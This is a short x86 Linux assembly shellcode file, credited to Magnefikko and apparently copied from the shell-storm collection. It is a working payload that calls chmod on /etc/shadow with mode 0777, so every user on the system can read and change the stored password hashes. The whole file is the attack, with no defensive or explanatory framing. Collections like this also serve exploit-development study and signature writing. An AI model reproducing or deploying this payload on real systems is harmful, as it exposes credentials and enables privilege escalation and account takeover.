; 29 bytes chmod("/etc/shadow", 0777) shellcode by Magnefikko
; Original: http://shell-storm.org/shellcode/files/shellcode-593.php

global _start

section .text

_start:

xor eax,eax
push eax

push dword 0x776f6461
push dword 0x68732f63
push dword 0x74652f2f

mov ebx,esp

push word 0x1ff

pop ecx

mov al,0xf
int 0x80
